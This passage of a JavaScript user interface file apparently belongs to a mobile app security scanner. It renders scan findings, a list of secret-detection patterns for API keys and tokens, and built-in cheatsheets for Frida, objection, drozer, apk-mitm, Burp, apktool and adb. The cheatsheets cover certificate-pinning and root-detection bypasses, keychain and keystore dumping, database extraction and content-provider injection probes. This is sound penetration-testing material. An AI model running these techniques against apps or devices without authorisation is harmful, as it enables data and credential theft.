  if (!list.length){ $('#deeplinks-content').innerHTML = '<div class="dim">No deep links found.</div>'; return; }
  $('#deeplinks-content').innerHTML = `<div class="box"><h3>Deep links (${list.length})</h3>
    <table class="tbl">
      <thead><tr><th>URI</th><th>Activity</th><th style="width:90px">Verified</th></tr></thead>
      <tbody>
        ${list.map(d => `<tr>
          <td><code class="inline">${esc(d.uri || '')}</code></td>
          <td><code class="inline">${esc(d.activity || '')}</code></td>
          <td>${d.auto_verify ? '<span style="color:var(--good)">✓ verified</span>' : '<span style="color:var(--warn)">⚠ unverified</span>'}</td>
        </tr>`).join('')}
      </tbody>
    </table></div>`;
}

// ====== Permissions ======
function renderPermissions(list){
  if (!list.length){ $('#permissions-content').innerHTML = '<div class="dim">None.</div>'; return; }
  $('#permissions-content').innerHTML = `<div class="box"><h3>Permissions (${list.length})</h3>
    <table class="tbl"><tbody>${list.map(p => `<tr><td><code class="inline">${esc(p)}</code></td></tr>`).join('')}</tbody></table>
  </div>`;
}

// ====== Secrets / API Keys ======
function renderSecrets(){
  const r = STATE.report;
  if (!r) return;
  const secrets = (r.findings || []).filter(f =>
    (f.id||'').startsWith('secret-') || (f.id||'').startsWith('ios-secret-'));
  const box = $('#secrets-content');

  if (!secrets.length){
    box.innerHTML = `
      <div style="padding:24px;text-align:center;color:var(--muted);
                  background:var(--bg);border:1px dashed var(--border);border-radius:8px">
        <div style="font-size:32px;opacity:.4;margin-bottom:8px">⚿</div>
        <div style="font-size:14px;margin-bottom:6px;color:var(--text-2)">No hardcoded secrets matched</div>
        <div style="font-size:12px;line-height:1.6">
          The 40+ patterns below were checked against this app's binary, resources, and DEX strings.<br>
          Either the app handles secrets correctly via a backend, or any secrets use a custom format.
        </div>
      </div>`;
  } else {
    box.innerHTML = secrets.map((f, i) => {
      const idx = (r.findings || []).indexOf(f);
      return `
      <div class="secret-card" data-i="${idx}">
        <div class="secret-head">
          <span class="sev-tag ${esc(f.severity)}">${esc(f.severity.toUpperCase())}</span>
          <span class="secret-title">${esc(f.title)}</span>
          ${f.cvss ? `<span class="cvss-pill">CVSS ${esc(f.cvss.toFixed(1))}</span>` : ''}
          ${f.cve ? `<span class="cve-pill">${esc(f.cve)}</span>` : ''}
          ${f.cwe ? `<span class="cwe-tag">${esc(f.cwe)}</span>` : ''}
        </div>
        <div class="secret-evidence"><code>${esc(f.evidence || '')}</code></div>
        ${f.impact ? `<div class="secret-impact"><b>Impact:</b> ${esc(f.impact)}</div>` : ''}
        <div class="secret-actions">
          <button class="btn sm" onclick="(()=>{document.querySelector('[data-view=findings]').click(); setTimeout(()=>openDetail(${idx}), 80);})()">Open in Findings</button>
          <button class="btn sm" onclick="(()=>{document.querySelector('[data-view=pocs]').click();})()">View validator PoC</button>
        </div>
      </div>`;
    }).join('');
  }

  // Render the patterns scanned panel
  const patterns = [
    'AWS Access Key (AKIA/ASIA/...)','AWS Secret Access Key','AWS Session Token',
    'Google Cloud / Firebase API key','GCP service-account JSON','GCP OAuth client',
    'Azure Storage Key','Azure connection string','DigitalOcean PAT','Heroku API key',
    'GitHub PAT (ghp_/gho_/ghu_/ghs_/ghr_)','GitHub fine-grained PAT (github_pat_)',
    'GitLab Personal Token (glpat-)','npm token (npm_)','CircleCI token',
    'Stripe live/test secret (sk_)','Stripe restricted (rk_)','Stripe publishable (pk_)',
    'PayPal Braintree token','Square access token',
    'Slack bot/user (xoxb-/xoxp-)','Slack webhook (hooks.slack.com)','Discord bot token',
    'Discord webhook','Telegram bot token','Twilio Account SID (AC...)',
    'SendGrid API key (SG.)','Mailgun API key (key-)','Mailchimp API key (xxxx-us##)',
    'Postmark Server Token','Mapbox access token (pk.eyJ)',
    'OpenAI API key (sk-)','Anthropic API key (sk-ant-)','Hugging Face token (hf_)',
    'JWT (eyJ.eyJ.)','Private Key (PEM/PGP/RSA/EC/SSH)',
    'AWS S3 bucket URL','RFC1918 internal IP','Generic credential pattern',
  ];
  $('#secrets-patterns').innerHTML = patterns.map(p => `<span class="pattern-pill">${esc(p)}</span>`).join('');
}

// ====== Saved Scans (handled by refreshScans which is called from init/upload) ======

// ====== Reports tab: full management UI ======
async function loadReportsTab(){
  const box = $('#reports-content');
  box.innerHTML = '<div class="dim" style="padding:24px;text-align:center">Loading saved scans…</div>';
  try {
    const r = await fetch('/api/scans');
    if (!r.ok){ box.innerHTML = '<div class="banner bad">Failed to load reports list (HTTP ' + r.status + ').</div>'; return; }
    const data = await r.json();
    const scans = data.scans || [];
    if (!scans.length){
      box.innerHTML = '<div class="box"><div class="dim" style="padding:30px;text-align:center;font-size:13px">No saved reports yet.<br><span style="font-size:11px;color:var(--muted-2)">Upload an APK or fetch from a store URL to create your first scan.</span></div></div>';
      return;
    }
    _RENDER_REPORTS(scans);
  } catch (e) {
    box.innerHTML = '<div class="banner bad">Error: ' + esc(e.message) + '</div>';
  }
}

function _RENDER_REPORTS(scans){
  // API returns: scan_id, filename, package, platform, summary, version_name, scan_date, mtime, size_bytes
  // Sort by mtime descending (most recent first)
  scans = [...scans].sort((a,b) => (b.mtime || 0) - (a.mtime || 0));
  const filter = ($('#reports-filter')?.value || '').trim().toLowerCase();
  const filtered = filter ? scans.filter(s =>
    (s.package || '').toLowerCase().includes(filter) ||
    (s.filename || '').toLowerCase().includes(filter)
  ) : scans;

  const totalSize = scans.reduce((sum, s) => sum + (s.size_bytes || 0), 0);
  let html = `<div class="reports-summary">
    <div class="reports-stat"><div class="value">${scans.length}</div><div class="label">Total reports</div></div>
    <div class="reports-stat"><div class="value">${(totalSize / 1024 / 1024).toFixed(1)} MB</div><div class="label">Disk used</div></div>
    <div class="reports-stat"><div class="value">${scans.filter(s => s.platform === 'Android').length}</div><div class="label">Android</div></div>
    <div class="reports-stat"><div class="value">${scans.filter(s => s.platform === 'iOS').length}</div><div class="label">iOS</div></div>
  </div>`;

  html += '<div class="reports-list">';
  for (const s of filtered){
    const sid = s.scan_id || '';
    const date = s.scan_date ? new Date(s.scan_date).toLocaleString()
                : (s.mtime ? new Date(s.mtime * 1000).toLocaleString() : '?');
    const sev = s.summary || {};
    const total = (sev.critical||0)+(sev.high||0)+(sev.medium||0)+(sev.low||0)+(sev.info||0);
    const dispName = s.package || s.filename || sid;
    html += `<div class="report-card" data-sid="${esc(sid)}" data-platform="${esc(s.platform||'Android')}">
      <div class="report-head">
        <span class="platform-pill ${esc((s.platform||'').toLowerCase())}">${esc(s.platform || '?')}</span>
        <div class="report-titles">
          <div class="report-name">${esc(dispName)}</div>
          <div class="report-meta">${s.version_name ? 'v' + esc(s.version_name) + ' · ' : ''}scanned ${esc(date)} · ${(s.size_bytes/1024).toFixed(1)} KB</div>
        </div>
        <div class="report-sev-strip">
          ${sev.critical ? `<span class="sev-tag critical">${sev.critical} crit</span>` : ''}
          ${sev.high ? `<span class="sev-tag high">${sev.high} high</span>` : ''}
          ${sev.medium ? `<span class="sev-tag medium">${sev.medium} med</span>` : ''}
          ${sev.low ? `<span class="sev-tag low">${sev.low} low</span>` : ''}
          ${!total ? '<span class="dim" style="font-size:11px">no findings</span>' : ''}
        </div>
      </div>
      <div class="report-actions">
        <button class="btn sm" data-act="open" data-sid="${esc(sid)}">▸ Open</button>
        <a class="btn sm" href="/api/scan/${esc(sid)}/report.html" target="_blank">↓ HTML</a>
        <a class="btn sm" href="/api/scan/${esc(sid)}/report.pdf" target="_blank">↓ PDF</a>
        <a class="btn sm" href="/api/scan/${esc(sid)}/report.docx" target="_blank">↓ Word</a>
        <a class="btn sm" href="/api/scan/${esc(sid)}/report.xlsx" target="_blank">↓ Excel</a>
        <a class="btn sm" href="/api/scan/${esc(sid)}/report.json" target="_blank">↓ JSON</a>
        <div style="flex:1"></div>
        <button class="btn sm danger" data-act="delete" data-sid="${esc(sid)}" data-name="${esc(dispName)}">✕ Delete</button>
      </div>
    </div>`;
  }
  html += '</div>';
  if (!filtered.length && filter){
    html += '<div class="dim" style="padding:30px;text-align:center">No reports match "' + esc(filter) + '"</div>';
  }
  $('#reports-content').innerHTML = html;

  // Wire up delete and open via event delegation -- avoids quote-escaping bugs
  // that broke inline onclick= when dispName contained special characters.
  $$('#reports-content [data-act="open"]').forEach(btn => {
    btn.onclick = () => {
      const sid = btn.dataset.sid;
      const platform = btn.closest('[data-platform]')?.dataset.platform
        || btn.closest('.report-card')?.querySelector('.platform-pill')?.textContent?.trim();
      loadSavedScan(sid, platform);
    };
  });
  $$('#reports-content [data-act="delete"]').forEach(btn => {
    btn.onclick = () => deleteScan(btn.dataset.sid, btn.dataset.name);
  });
}

async function loadSavedScan(sid, hintPlatform){
  // Mimic what saved-scans sidebar does
  try {
    const r = await fetch('/api/scan/' + sid + '/report.json');
    if (!r.ok){ alert('Could not load scan: ' + r.status); return; }
    const report = await r.json();
    STATE.scanId = sid;
    STATE.report = report;
    const effectivePlatform = report.platform || hintPlatform || 'Android';
    renderScan(report);
    // Auto-navigate iOS reports to iOS Info.plist view
    if (effectivePlatform === 'iOS') {
      setTimeout(() => switchView('ios-info-plist'), 150);
    }
  } catch (e) { alert('Error: ' + e.message); }
}

async function deleteScan(sid, name){
  if (!confirm('Permanently delete scan "' + name + '"?\n\nThis removes the report, PoC artifacts, and the original APK file. Cannot be undone.')) return;
  try {
    const r = await fetch('/api/scan/' + sid, {method: 'DELETE'});
    if (!r.ok){
      const d = await r.json().catch(() => ({}));
      alert('Delete failed: ' + (d.detail || r.status));
      return;
    }
    // If we just deleted the currently-loaded scan, go back to welcome
    if (STATE.scanId === sid){
      STATE.scanId = null;
      STATE.report = null;
      showWelcome();
    }
    // Refresh the list and the sidebar saved-scans count
    loadReportsTab();
    if (typeof refreshScans === 'function') refreshScans();
  } catch (e) { alert('Error: ' + e.message); }
}

// ====== PoCs ======
async function loadPocs(){
  try{
    const r = await (await fetch('/api/scan/' + STATE.scanId + '/pocs')).json();
    STATE.pocs = r.pocs || [];
    $('#badge-pocs').textContent = STATE.pocs.length;
    renderPocs();
  } catch(e){ $('#pocs-content').innerHTML = '<div class="banner bad">Error: '+esc(e.message)+'</div>'; }
}

function renderPocs(){
  const pocs = STATE.pocs;
  if (!pocs.length){ $('#pocs-content').innerHTML = '<div class="dim">No applicable PoCs.</div>'; return; }
  let html = '';
  const ver = pocs.filter(p => p.confidence === 'verified').length;
  const fail = pocs.filter(p => p.confidence === 'failed').length;
  if (ver || fail){
    html += `<div class="banner ${ver?'ok':'warn'}">Device verification: <b>${ver}</b> verified, ${fail} failed.</div>`;
  }
  for (const p of pocs){
    html += `<div class="poc severity-${esc(p.severity)}">
      <div class="poc-head">
        <span class="sev-tag ${esc(p.severity)}">${esc(p.severity.toUpperCase())}</span>
        <span class="poc-title">${esc(p.title)}</span>
        <span class="confidence-pill ${esc(p.confidence)}" data-c="${esc(p.confidence)}">${esc(p.confidence.toUpperCase())}</span>
      </div>
      <div class="poc-why">${esc(p.why)}</div>
      <div class="poc-impact"><b>Impact:</b> ${esc(p.impact)}</div>
      <div class="poc-files">
        ${(p.artifacts || []).map(a => `<a class="file-pill" href="/api/scan/${STATE.scanId}/poc/${esc(p.id)}/${esc(a.filename)}" target="_blank">▸ ${esc(a.filename)}</a>`).join('')}
        <a class="file-pill" href="/api/scan/${STATE.scanId}/poc/${esc(p.id)}/zip" style="color:var(--good)">↓ zip</a>
      </div>
      ${p.last_run ? `<div style="margin-top:8px"><div class="section-title">Verification command</div><pre>${esc(p.last_run.command || '')}</pre><div class="section-title">Output</div><pre>${esc((p.last_run.stdout||'') + (p.last_run.stderr||''))}</pre></div>` : ''}
    </div>`;
  }
  $('#pocs-content').innerHTML = html;
}

async function verifyPocs(){
  if (!STATE.devices.length){
    alert('No device connected. Open Dynamic Test → Refresh to detect a connected device.');
    return;
  }
  const serial = $('#dyn-device').value || STATE.devices[0].serial;
  const btn = $('#poc-verify-btn');
  btn.disabled = true; btn.textContent = 'Verifying…';
  $('#pocs-content').innerHTML = `<div class="banner warn">Running each PoC against ${esc(serial)}… 30–90 seconds.</div>` + $('#pocs-content').innerHTML;
  try{
    const r = await (await fetch('/api/scan/' + STATE.scanId + '/pocs/verify', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({serial})
    })).json();
    STATE.pocs = r.pocs || [];
    renderPocs();
  } catch(e){
    $('#pocs-content').innerHTML = '<div class="banner bad">Error: ' + esc(e.message) + '</div>';
  }
  btn.disabled = false; btn.textContent = '▶ Auto-verify on device';
}

// ====== Advisor ======
async function loadAdvisor(){
  const r = await (await fetch('/api/scan/' + STATE.scanId + '/playbook')).json();
  const blocks = r.playbook || [];
  if ($('#badge-advisor')) $('#badge-advisor').textContent = blocks.length;
  if (!blocks.length){ $('#advisor-content').innerHTML = '<div class="dim">No advisor entries.</div>'; return; }
  $('#advisor-content').innerHTML = blocks.map(b => `<div class="box">
    <div class="row" style="margin-bottom:6px">
      <span class="sev-tag ${esc(b.severity)}">${esc(b.severity.toUpperCase())}</span>
      <h3 style="margin:0">${esc(b.title)}</h3>
    </div>
    <div class="sub">${esc(b.why || '')}</div>
    ${(b.steps || []).map(s => `<div class="section-title">${esc(s[0])}</div><pre>${esc(s[1])}</pre>`).join('')}
  </div>`).join('');
}

// ====== Frida / Tools ======
const TOOL_TITLES = {
  ssl: 'Frida — SSL Pinning Bypass',
  root: 'Frida — Root Detection Bypass',
  dump: 'Frida — Universal Runtime Dumper',
  'frida-tools': 'frida-tools cheatsheet',
  objection: 'Objection cheatsheet',
  drozer: 'Drozer cheatsheet',
  apkmitm: 'apk-mitm — Static cert pinning bypass',
  reflutter: 'reFlutter — Flutter MITM',
  burp: 'Burp + mitmproxy setup',
  apktool: 'apktool / jadx — Decompile & repackage',
  adb: 'adb cheatsheet',
  'ios-frida': 'iOS — Frida + objection',
  'ios-class-dump': 'iOS — class-dump + Hopper',
  mobsf: 'MobSF — Mobile Security Framework',
  rms: 'RMS — Runtime Mobile Security',
  qark: 'QARK — Quick Android Review Kit',
};

// Static cheatsheets we render client-side (no backend roundtrip).
function getToolCheatsheet(kind, pkg){
  pkg = pkg || (STATE.report?.metadata?.package || 'com.example.app');
  const sheets = {
    'frida-tools': `# Frida tools cheatsheet -- target: ${pkg}

# Setup
pip install frida-tools
# Push frida-server (matching device ABI):
wget https://github.com/frida/frida/releases/latest/download/frida-server-XX-android-arm64.xz
xz -d frida-server-*.xz
adb push frida-server-* /data/local/tmp/frida-server
adb shell "chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# Discovery
frida-ps -U                          # running processes
frida-ps -Uai                        # all installed apps
frida-ls-devices                      # list devices

# Auto-trace (no scripting)
frida-trace -U -f ${pkg} -j '*!*' --no-pause                 # trace EVERY method
frida-trace -U -f ${pkg} -j 'com.target.network.HttpClient!*' --no-pause
frida-trace -U -f ${pkg} -i 'open' -i 'read'                  # native-level
frida-trace -U -f ${pkg} -m '*[NSURL* *]'                     # iOS / ObjC

# Persistent gadget (non-rooted devices)
apk-mitm target.apk --frida-gadget   # patches APK to load Frida gadget on launch
adb install -r target-patched.apk
frida -U Gadget                       # attach by 'Gadget' name`,

    objection: `# Objection cheatsheet -- target: ${pkg}

# Setup
pip install objection

# Attach
objection -g ${pkg} explore           # spawn + attach

# === Inside objection ===
env                                    # paths and config
android hooking list activities        # enumerate activities
android hooking list services
android hooking list receivers

# Bypasses (the killer features)
android sslpinning disable             # universal SSL pinning bypass
android root disable                   # bypass root detection
ios sslpinning disable                 # iOS variant
ios jailbreak disable                  # iOS jailbreak detection bypass

# Storage
android keystore list                  # list AndroidKeyStore entries
android keystore dump                  # dump key material (rooted only)
android shell_exec id                  # run shell as the app
ls /data/data/${pkg}/databases
file download /data/data/${pkg}/databases/users.db ./users.db
sqlite connect ./users.db              # interactive sqlite

# Method hooking
android hooking watch class com.example.target.Auth
android hooking watch class_method com.example.target.Auth.login --dump-args --dump-return --dump-backtrace
android hooking generate simple com.example.target.Auth

# Memory
memory list modules
memory dump all /tmp/dump_dir
memory search "API_KEY" --string

# iOS-specific
ios keychain dump
ios cookies get
ios nsuserdefaults get
ios pasteboard monitor`,

    drozer: `# Drozer cheatsheet -- target: ${pkg}

# Setup
pip install drozer
adb install drozer-agent.apk          # download from https://github.com/WithSecureLabs/drozer
adb forward tcp:31415 tcp:31415       # then open agent on device, enable embedded server
drozer console connect

# Recon
run app.package.info -a ${pkg}
run app.package.attacksurface ${pkg}
run app.package.manifest ${pkg}

# Activities
run app.activity.info -a ${pkg}
run app.activity.start --component ${pkg} <ActivityName> --extra string user_id 1

# Services / Receivers
run app.service.info -a ${pkg}
run app.service.start --component ${pkg} <ServiceName> --extra string command exec
run app.broadcast.info -a ${pkg}
run app.broadcast.send --component ${pkg} <ReceiverName>

# Content Providers (richest attack surface)
run app.provider.info -a ${pkg}
run app.provider.finduri ${pkg}        # find readable URIs
run app.provider.query content://<authority>/users
run scanner.provider.injection -a ${pkg}    # SQLi probe
run scanner.provider.traversal -a ${pkg}    # path traversal probe
run app.provider.read content://<authority>/../../databases/users.db

# Misc scanners
run scanner.misc.native -a ${pkg}
run scanner.misc.checkjavabridges -a ${pkg}`,

    apkmitm: `# apk-mitm -- patch APK to disable cert pinning
# Target: ${pkg}

# Setup (Node.js >= 14)
npm install -g apk-mitm

# Pull the original APK
adb shell pm path ${pkg}
adb pull /data/app/${pkg}-1/base.apk ./target.apk

# Patch
apk-mitm ./target.apk
# Output: ./target-patched.apk

# Install patched
adb uninstall ${pkg}
adb install ./target-patched.apk

# Now install your Burp / mitmproxy CA cert as USER cert (Android Settings)
# All traffic decrypts in Burp / mitmproxy.

# For app bundles (.aab):
java -jar bundletool.jar build-apks --bundle=app.aab --output=app.apks
unzip -j app.apks splits/base-master.apk
apk-mitm base-master.apk

# Pair with: --frida-gadget (auto-injects Frida loader)
apk-mitm ./target.apk --frida-gadget
# After install, attach via: frida -U Gadget`,

    reflutter: `# reFlutter -- MITM Flutter apps
# Target: ${pkg}  (must contain libflutter.so)

# Confirm it's a Flutter app
unzip -l target.apk | grep libflutter.so

# Setup
pip install reflutter

# Patch (prompts for your proxy IP)
reflutter target.apk
# Output: release.RE.apk

# Sign the patched APK
keytool -genkey -v -keystore poc.keystore -alias poc -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \\
  -keystore poc.keystore release.RE.apk poc

# Install
adb uninstall ${pkg}
adb install release.RE.apk

# Run Burp on 192.168.1.100:8083 (default reflutter listens here)
# All Flutter HTTPS traffic now decrypts.

# Alternative: flutter-spy for runtime inspection
git clone https://github.com/Guardsquare/flutter-spy
frida -U -f ${pkg} -l flutter-spy/flutter-spy.js --no-pause`,

    burp: `# Burp / mitmproxy MITM setup -- target: ${pkg}

# === Burp Suite ===
# Burp > Proxy > Options > Add listener: bind to all interfaces, port 8080
# Burp > Proxy > Import / Export CA -> DER -> burp.crt

# === mitmproxy ===
mitmweb -p 8080         # web UI on http://127.0.0.1:8081
mitmproxy -p 8080       # ncurses CLI

# === Install CA on device (USER cert) ===
adb push burp.crt /sdcard/
# Settings > Security > Install certificate > burp.crt

# === Android 7+ requires SYSTEM cert for app trust ===
# Rooted device:
adb root && adb remount
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -1)
adb push burp.crt /system/etc/security/cacerts/\${HASH}.0
adb shell chmod 644 /system/etc/security/cacerts/\${HASH}.0
adb reboot

# === Device proxy config ===
# Wi-Fi > long-press > Modify > Proxy: Manual
# Host: <attacker-ip>   Port: 8080

# === Capture script (mitmproxy addon) ===
cat > capture.py <<'EOF'
def response(flow):
    if "${pkg.split('.')[1] || 'app'}" in flow.request.host:
        print(f"[{flow.request.method}] {flow.request.pretty_url}")
        if flow.request.content:
            print(f"  Body: {flow.request.content[:500]}")
EOF
mitmproxy -p 8080 -s capture.py`,

    apktool: `# apktool / jadx -- decompile, modify, repackage
# Target: ${pkg}

# === Pull APK ===
adb shell pm path ${pkg}
adb pull <path>/base.apk target.apk

# === DECOMPILE (smali) ===
brew install apktool                      # mac
sudo apt install apktool                  # linux
apktool d target.apk -o target_decomp/

# Output structure:
#   target_decomp/AndroidManifest.xml      <- decoded XML
#   target_decomp/smali/                    <- Dalvik bytecode
#   target_decomp/res/                      <- resources

# === DECOMPILE (Java) -- jadx is friendlier for code review ===
brew install jadx
jadx -d target_jadx/ target.apk
# Or open the GUI:
jadx-gui target.apk

# === SEARCH FOR INTERESTING STRINGS ===
grep -r "API_KEY" target_jadx/
grep -r "https://api" target_jadx/
grep -r "okhttp" target_decomp/smali/
grep -r "JavaScriptInterface" target_decomp/smali/

# === MODIFY + REPACKAGE ===
# After editing smali files:
apktool b target_decomp/ -o modified.apk
# Sign it
keytool -genkey -v -keystore my.keystore -alias my -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \\
  -keystore my.keystore modified.apk my
# Align (optional but recommended)
zipalign -v 4 modified.apk modified-aligned.apk
adb install -r modified-aligned.apk

# === BYTECODE-LEVEL PINNING BYPASS (when apk-mitm fails) ===
# Find OkHttp CertificatePinner class:
grep -r "Lokhttp3/CertificatePinner" target_decomp/smali/
# Edit the .check() method to immediately return-void.
# Then repackage + sign + install.`,

    adb: `# adb cheatsheet -- target: ${pkg}

# === Connectivity ===
adb devices                              # list devices
adb -s <serial> shell                    # open shell on specific device
adb tcpip 5555 && adb connect <ip>:5555  # wireless adb
adb root                                  # root the adbd (rooted/userdebug only)
adb remount                               # mount /system rw

# === App management ===
adb install -r app.apk                   # install/update
adb install -t app.apk                   # allow test/debug APKs
adb uninstall ${pkg}
adb shell pm clear ${pkg}                # wipe app data
adb shell pm disable ${pkg}              # disable
adb shell pm path ${pkg}                 # find APK on disk
adb pull <path>/base.apk

# === Launch / inspect ===
adb shell am start -n ${pkg}/.MainActivity
adb shell am force-stop ${pkg}
adb shell pidof ${pkg}                   # PID
adb shell dumpsys package ${pkg}         # everything about the app
adb shell dumpsys activity ${pkg}
adb shell dumpsys meminfo ${pkg}

# === Logs ===
adb logcat                                # full log
adb logcat --pid=$(adb shell pidof ${pkg})   # filter to app
adb logcat -c                             # clear

# === Files ===
adb shell run-as ${pkg}                  # shell as app UID (debuggable apps)
adb shell ls /data/data/${pkg}/
adb shell cat /data/data/${pkg}/shared_prefs/*.xml
adb pull /data/data/${pkg}/databases/users.db

# === Intents ===
adb shell am start -a android.intent.action.VIEW -d "myapp://path"
adb shell am broadcast -a com.example.ACTION_FOO
adb shell am startservice -n ${pkg}/.SyncService --es cmd "id"

# === Device info ===
adb shell getprop                        # build properties
adb shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png
adb shell screenrecord /sdcard/r.mp4     # record screen

# === Network ===
adb shell ss -tn                          # TCP connections
adb shell cat /proc/net/tcp               # raw

# === scrcpy (BONUS -- mirror device to PC) ===
brew install scrcpy
scrcpy --record=session.mp4`,

    'ios-frida': `# iOS — Frida + objection -- target: ${pkg}

# === Device setup (jailbroken) ===
# Add Frida repo to Cydia/Sileo: https://build.frida.re
# Install: Frida package
# OR (non-jailbroken): re-sign IPA with frida-gadget.dylib

# === Connect ===
frida-ps -U
frida-ps -Uai
frida -U -f ${pkg} --no-pause

# === Objection ===
objection --gadget ${pkg} explore

# Inside objection prompt:
ios sslpinning disable                  # universal SSL bypass
ios jailbreak disable
ios keychain dump
ios cookies get
ios nsuserdefaults get
ios pasteboard monitor
ios ui dump
ios hooking list classes
ios hooking watch class AuthManager
ios hooking watch method '-[AuthManager validateToken:]' --dump-args --dump-return

# === Filesystem ===
env
ls /var/mobile/Containers/Data/Application/<UUID>/Documents
file download <path> ./local.dat

# === Universal SSL pinning bypass scripts ===
git clone https://github.com/HToTheTL/iOS_SSL_Pinning_Bypass
frida -U -f ${pkg} -l iOS_SSL_Pinning_Bypass/script.js --no-pause

# === Anti-jailbreak bypass ===
git clone https://github.com/Brandon-Roe/JailbreakDetectionBypass
frida -U -f ${pkg} -l JailbreakDetectionBypass/script.js --no-pause

# === Cycript (alternative) ===
cycript -p ${pkg}
# > [NSBundle mainBundle]
# > choose(UIViewController)`,

    'ios-class-dump': `# iOS — class-dump + Hopper static reverse engineering
# Target: ${pkg}

# === Decrypt the IPA first (FairPlay) ===
# On jailbroken device:
brew install ideviceinstaller
ideviceinstaller -l                       # list installed apps
# Use frida-ios-dump or Clutch to decrypt:
git clone https://github.com/AloneMonkey/frida-ios-dump
cd frida-ios-dump
./dump.py ${pkg}
# Output: <AppName>.ipa (decrypted)

# === Extract and inspect ===
unzip <AppName>.ipa -d app/
otool -L app/Payload/<AppName>.app/<AppName>     # dependencies
otool -h app/Payload/<AppName>.app/<AppName>     # arch / load commands
file app/Payload/<AppName>.app/<AppName>          # arm64? thin/fat?

# === class-dump (extract ObjC headers) ===
brew install class-dump
class-dump -H app/Payload/<AppName>.app/<AppName> -o headers/
ls headers/                              # one .h per ObjC class
grep -r "API_KEY" headers/

# === Hopper Disassembler (commercial, but indispensable) ===
# https://www.hopperapp.com/
# File > Read Executable to Disassemble > select binary
# - Cross-references
# - Pseudo-Objective-C decompilation
# - Patch + save modified binary

# === Ghidra (free alternative) ===
# https://ghidra-sre.org/
# Open binary -> auto-analyze -> decompiler view

# === strings ===
strings -a app/Payload/<AppName>.app/<AppName> | grep -E "https://|sk_live|AKIA|Bearer "

# === Property lists ===
plutil -p app/Payload/<AppName>.app/Info.plist
plutil -p app/Payload/<AppName>.app/embedded.mobileprovision

# === entitlements ===
codesign -d --entitlements - app/Payload/<AppName>.app/<AppName>`,

    mobsf: `# MobSF -- self-host setup
# Mobile Security Framework: full automated scanner with web UI

# === Docker (recommended) ===
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -d -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
# Open http://127.0.0.1:8000

# === Native install (Linux/Mac) ===
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF
cd Mobile-Security-Framework-MobSF
./setup.sh                                # installs deps, builds DB
./run.sh                                  # starts on 127.0.0.1:8000

# === API access (for CI integration) ===
# Generate API key: Settings > API key
curl -X POST http://127.0.0.1:8000/api/v1/upload \\
  -H "Authorization: <API_KEY>" \\
  -F "file=@target.apk"

curl -X POST http://127.0.0.1:8000/api/v1/scan \\
  -H "Authorization: <API_KEY>" \\
  -d "scan_type=apk&hash=<from_upload>"

curl http://127.0.0.1:8000/api/v1/report_pdf \\
  -H "Authorization: <API_KEY>" \\
  -d "hash=<from_upload>" -o report.pdf

# === When to prefer MobSF over Vexa ===
# - You need the Mobile Application Penetration Testing Methodology (MAPM) report format
# - Your CI needs the full set of MASTG checks
# - You need built-in dynamic analysis VM (MobSF ships an Android emulator orchestrator)

# === When Vexa fits better ===
# - Single Python file, no Docker / Postgres / RabbitMQ
# - On-device dynamic actions (Quick Actions tab) instead of emulator orchestration
# - Inline AI Console with exploit generation
# - Faster startup, lower resource use`,

    rms: `# RMS — Runtime Mobile Security
# Web UI on top of Frida -- great for non-CLI users

# === Setup ===
git clone https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security
cd RMS-Runtime-Mobile-Security
npm install
npm start
# Open http://127.0.0.1:5491

# === Features ===
# - Live Frida script editor with auto-generated stubs from class browser
# - Method tracer: pick a class, click methods to hook, see args/returns live
# - Class graph: visualize the app's class hierarchy
# - Memory dumper: dump heap + search for strings
# - Built-in scripts: SSL pinning bypass, root detection bypass, anti-debug bypass

# === Usage ===
# 1. Connect device, run frida-server
# 2. In RMS web UI: select USB device + target app
# 3. Click "Spawn" or "Attach"
# 4. Use the GUI to:
#    - Browse loaded classes
#    - Trace any method by clicking
#    - Run pre-built bypass scripts
#    - Edit live JS hooks

# === Why RMS instead of pure Frida ===
# - GUI for analysts who don't want to write JS
# - Visual class browser (Frida CLI gives you a flat list)
# - Faster iteration on hooks (live editor)`,

    qark: `# QARK — Quick Android Review Kit (LinkedIn)

# === Setup ===
pip install qark

# === Static analysis ===
qark --apk target.apk --report-type html --report-path qark-report.html
# Or
qark --java target_jadx_java/src --report-type html

# === What it finds ===
# - Tap-jacking
# - Implicit intents that leak data
# - Insecure broadcast receivers
# - Insecure logging
# - World-readable / world-writable file usage
# - WebView misconfigs (JS enabled + addJavaScriptInterface)
# - SQL injection in ContentProviders
# - Hardcoded credentials

# === Auto-PoC generation ===
# QARK can generate runnable test APKs to exercise findings:
qark --apk target.apk --exploit-apk
# Output: qark/build/qark-exploit.apk

# === Why use QARK instead of Vexa ===
# - QARK auto-builds a full exploit APK with multiple test activities
# - Has been around longer; familiar to many CI pipelines

# === Why use Vexa instead of QARK ===
# - Vexa supports iOS (QARK is Android-only)
# - Vexa has interactive AI Console + on-demand exploit gen
# - QARK is slower and dumps verbose HTML; Vexa is fast and structured`,
  };
  return sheets[kind] || null;
}

async function loadFrida(kind){
  $('#frida-view').style.display = 'block';
  $('#frida-title').textContent = TOOL_TITLES[kind] || kind;

  // Try local cheatsheet first
  const local = getToolCheatsheet(kind);
  if (local){
    $('#frida-code').textContent = local;
    $('#frida-view').scrollIntoView({behavior: 'smooth'});
    return;
  }

  // Fallback: server-side Frida scripts (ssl/root/dump)
  $('#frida-code').textContent = 'Loading...';
  try {
    const r = await fetch('/api/scan/' + STATE.scanId + '/frida/' + kind);
    if (!r.ok){ $('#frida-code').textContent = 'Tool not available: HTTP ' + r.status; return; }
    const t = await r.text();
    $('#frida-code').textContent = t;
    $('#frida-view').scrollIntoView({behavior: 'smooth'});
  } catch (e) {
    $('#frida-code').textContent = 'Error: ' + e.message;
  }
}

// ====== Dynamic ======
async function loadDevices(){
  const banner = $('#dyn-banner');
  if (!STATE.health?.adb){
    banner.className = 'banner warn';
    banner.innerHTML = 'adb not on PATH. Install Android platform-tools to enable dynamic testing.';
